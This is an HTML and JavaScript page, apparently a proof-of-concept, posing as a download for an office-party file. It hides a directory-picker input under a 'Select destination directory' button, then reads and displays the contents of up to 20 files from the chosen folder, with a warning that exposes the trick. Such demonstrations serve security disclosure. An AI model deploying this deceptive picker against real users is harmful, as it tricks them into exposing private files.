<style>
    form {
        display: table;
        margin: 0 auto;
        text-align: center;
    }
    form > #buttons {
        display: inline-block;
        position: relative;
        bottom: 10px;
        text-align: left;
    }
    form > #buttons > div.picker-container {
        display: inline-block;
        position: relative;
        overflow: hidden;
    }
    input[type="file"] {
        position: absolute;
        top: -22px;
        left: -22px;
        font-size: 50px;
        opacity: 0.01;
    }
    #warning {
        display: none;
        color: white;
        background: red;
    }
    #out {
        display: block;
        white-space: pre-wrap;
    }
    #out > div.preview {
        height: 2.4em;
        overflow: hidden;
        border: 1px solid black;
    }
    #out > img.thumb {
        display: block;
        height: 2.4em;
        border: 1px solid black;
    }
</style>
<form>
    <h2>Download "secret-photos-from-the-office-party.ppt"</h2>
    <div id="buttons">
        1.
        <div class="picker-container">
            <input type="file" id="directory" webkitdirectory directory>
            <button>Select destination directory</button>
        </div><br>
        2.
        <button disabled>Download</button>
    </div>
    <img width="128" height="128">
</form>
<h2 id="warning">You just gave this untrusted website read access to <b></b> files in your
download folder! Here are the first <span></span>:</h2>
<output id="out"></output>
<script>
    var directoryInput = document.getElementById("directory");
    directoryInput.addEventListener("change", processDirectory, false);
    var out = document.getElementById("out");
    var warning = document.getElementById("warning");

    function processDirectory(evt) {
        if (!window.File || !window.FileReader || !window.FileList || !window.Blob) {
            alert('The File APIs are not fully supported in this browser.');
            return;
        }
        out.innerHTML = "";
        warning.style.display = "none";

        var fileList = evt.target.files;
        var numFiles = Math.min(fileList.length, 20);
        for (var i = 0; i < numFiles; i++) {
            var file = fileList[i];
            if (file.name == ".")
                continue;
            println(file.name + " " + file.size + " " + file.type);
            if (file.type.match('image/.*'))
                processImage(file);
            else
                processText(file);
        }

        if (fileList.length > 0) {
            warning.firstElementChild.textContent = fileList.length;
            warning.lastElementChild.textContent = numFiles;
            warning.style.display = "block";
        }
    }

    function processText(file) {
        var div = document.createElement("div");
        div.className = "preview";
        out.appendChild(div);

        var reader = new FileReader();
        reader.onload = function(evt) {
            if (div.textContent)
                div.textContent = evt.target.result;
            else
                div.innerText = evt.target.result;
        };
        var blob = file.slice(0, 1024); // byte range
        reader.readAsText(blob);
    }

    
    function processImage(file) {
        var img = document.createElement("img");
        img.className = "thumb";
        out.appendChild(img);

        var reader = new FileReader();
        reader.onload = function(evt) {
            img.setAttribute("src", evt.target.result);
        };
        reader.readAsDataURL(file);
    }
    

    function println(str) {
        var textNode = document.createTextNode(str + "\n");
        out.appendChild(textNode);
    }
